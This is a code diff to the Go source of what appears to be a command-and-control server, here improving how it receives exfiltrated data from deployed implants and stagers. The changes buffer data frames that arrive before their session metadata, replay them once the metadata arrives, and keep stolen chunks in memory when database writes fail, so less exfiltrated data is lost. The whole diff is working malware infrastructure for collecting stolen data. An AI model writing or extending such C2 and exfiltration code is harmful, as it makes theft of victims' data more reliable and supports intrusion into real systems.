@@ -101,6 +101,13 @@ type metadataAssembler struct {
 	finalIndex *uint32
 }
 
+type pendingLabelChunk struct {
+	payload  string
+	counter  uint32
+	flags    uint8
+	clientIP string
+}
+
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
 	ClientIP        string
@@ -134,6 +141,7 @@ type C2Manager struct {
 	resultBatchTimer     map[string]*time.Timer          // key: taskID, value: batch flush timer
 	submittedData        map[string]bool                 // key: taskID, value: true if we submitted any data to Master
 	metadataAssemblers   map[string]*metadataAssembler   // key: normalized session tag, value: pending metadata buffers
+	pendingLabelChunks   map[string][]pendingLabelChunk  // key: normalized session tag, value: buffered data frames awaiting metadata
 	mutex                sync.RWMutex
 	taskCounter          int // Counter for local tasks (standalone mode)
 	domainTaskCounter    int // Counter for domain update tasks (D prefix to avoid conflicts)
@@ -180,6 +188,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		exfilSessions:        make(map[string]*ExfilSession),
 		exfilTagIndex:        make(map[string]*ExfilTagTracker),
 		metadataAssemblers:   make(map[string]*metadataAssembler),
+		pendingLabelChunks:   make(map[string][]pendingLabelChunk),
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
@@ -740,32 +749,24 @@ func (c2 *C2Manager) handleExfilMetadataFrame(frame *ExfilFrame, clientIP string
 	}
 	c2.mutex.Unlock()
 
-	return c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
+	ack, err := c2.handleExfilChunk(frame.Payload, meta, clientIP, assembled)
+	if err == nil {
+		c2.flushPendingLabelChunks(frame.SessionTag)
+	}
+	return ack, err
 }
 
 func (c2 *C2Manager) handleExfilDataFrame(frame *ExfilFrame, clientIP string) (bool, error) {
 	tracker, ok := c2.getExfilTagTracker(frame.SessionTag)
 	if !ok || tracker.SessionID == 0 {
-		return false, fmt.Errorf("unknown exfil session tag %s", frame.SessionTag)
+		c2.enqueuePendingLabelChunk(frame, clientIP)
+		if c2.debug {
+			logf("[Exfil] buffered frame tag=%s idx=%d awaiting metadata", frame.SessionTag, frame.Counter)
+		}
+		return true, nil
 	}
 
-	meta := &ExfilMetadata{
-		Version:     ExfilProtocolVersion,
-		SessionID:   tracker.SessionID,
-		JobID:       tracker.JobID,
-		ChunkIndex:  frame.Counter,
-		TotalChunks: tracker.TotalChunks,
-	}
-	if tracker.TotalChunks == 0 {
-		meta.TotalChunks = frame.Counter
-	}
-	if meta.TotalChunks != 0 && frame.Counter == meta.TotalChunks {
-		meta.Flags |= ExfilFlagFinalChunk
-	}
-	if frame.Flags&FrameEnvelopeFlagFinal != 0 {
-		meta.Flags |= ExfilFlagFinalChunk
-	}
-
+	meta := c2.buildMetadataFromTracker(tracker, frame.Counter, frame.Flags)
 	return c2.handleExfilChunk(frame.Payload, meta, clientIP, nil)
 }
 
@@ -821,6 +822,7 @@ func (c2 *C2Manager) deleteExfilTagTracker(tag string) {
 	normalized := normalizeExfilTag(tag)
 	delete(c2.exfilTagIndex, normalized)
 	delete(c2.metadataAssemblers, normalized)
+	delete(c2.pendingLabelChunks, normalized)
 	c2.mutex.Unlock()
 }
 
@@ -868,6 +870,72 @@ func (c2 *C2Manager) appendMetadataSegment(tag string, index uint32, segment []b
 	}
 	c2.mutex.Unlock()
 	return payload, complete
+}
+
+func (c2 *C2Manager) enqueuePendingLabelChunk(frame *ExfilFrame, clientIP string) {
+	normalized := normalizeExfilTag(frame.SessionTag)
+	c2.mutex.Lock()
+	c2.pendingLabelChunks[normalized] = append(c2.pendingLabelChunks[normalized], pendingLabelChunk{
+		payload:  frame.Payload,
+		counter:  frame.Counter,
+		flags:    frame.Flags,
+		clientIP: clientIP,
+	})
+	c2.mutex.Unlock()
+}
+
+func (c2 *C2Manager) flushPendingLabelChunks(tag string) {
+	tracker, ok := c2.getExfilTagTracker(tag)
+	if !ok || tracker.SessionID == 0 {
+		return
+	}
+	pending := c2.drainPendingLabelChunks(tag)
+	for _, chunk := range pending {
+		meta := c2.buildMetadataFromTracker(tracker, chunk.counter, chunk.flags)
+		if _, err := c2.handleExfilChunk(chunk.payload, meta, chunk.clientIP, nil); err != nil && c2.debug {
+			logf("[Exfil] failed to process buffered chunk tag=%s idx=%d: %v", tag, chunk.counter, err)
+		}
+	}
+}
+
+func (c2 *C2Manager) drainPendingLabelChunks(tag string) []pendingLabelChunk {
+	normalized := normalizeExfilTag(tag)
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+	pending := c2.pendingLabelChunks[normalized]
+	if len(pending) > 0 {
+		delete(c2.pendingLabelChunks, normalized)
+	}
+	return pending
+}
+
+func (c2 *C2Manager) buildMetadataFromTracker(tracker *ExfilTagTracker, counter uint32, flags uint8) *ExfilMetadata {
+	meta := &ExfilMetadata{
+		Version:     ExfilProtocolVersion,
+		SessionID:   tracker.SessionID,
+		JobID:       tracker.JobID,
+		ChunkIndex:  counter,
+		TotalChunks: tracker.TotalChunks,
+	}
+	if tracker.TotalChunks == 0 {
+		meta.TotalChunks = counter
+	}
+	if meta.TotalChunks != 0 && counter == meta.TotalChunks {
+		meta.Flags |= ExfilFlagFinalChunk
+	}
+	if flags&FrameEnvelopeFlagFinal != 0 {
+		meta.Flags |= ExfilFlagFinalChunk
+	}
+	return meta
+}
+
+func (c2 *C2Manager) cacheChunkInMemory(session *ExfilSession, chunkIndex uint32, data []byte) {
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+	if session.PendingChunks == nil {
+		session.PendingChunks = make(map[uint32][]byte)
+	}
+	session.PendingChunks[chunkIndex] = append([]byte(nil), data...)
 }
 
 // handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
@@ -929,22 +997,18 @@ func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clien
 		var dbErr error
 		inserted, dbErr = c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext)
 		if dbErr != nil {
-			c2.mutex.Lock()
-			delete(session.ReceivedChunks, meta.ChunkIndex)
-			c2.mutex.Unlock()
-			return false, fmt.Errorf("failed to persist exfil chunk: %w", dbErr)
+			if c2.debug {
+				logf("[Exfil] DB persist failed (session=%s idx=%d): %v — caching in memory", sessionID, meta.ChunkIndex, dbErr)
+			}
+			c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
+			return true, nil
 		}
 		if !inserted {
 			// Chunk already on disk (likely due to retry) - treat as duplicate
 			return true, nil
 		}
 	} else {
-		c2.mutex.Lock()
-		if session.PendingChunks == nil {
-			session.PendingChunks = make(map[uint32][]byte)
-		}
-		session.PendingChunks[meta.ChunkIndex] = append([]byte(nil), plaintext...)
-		c2.mutex.Unlock()
+		c2.cacheChunkInMemory(session, meta.ChunkIndex, plaintext)
 	}
 
 	now := time.Now()
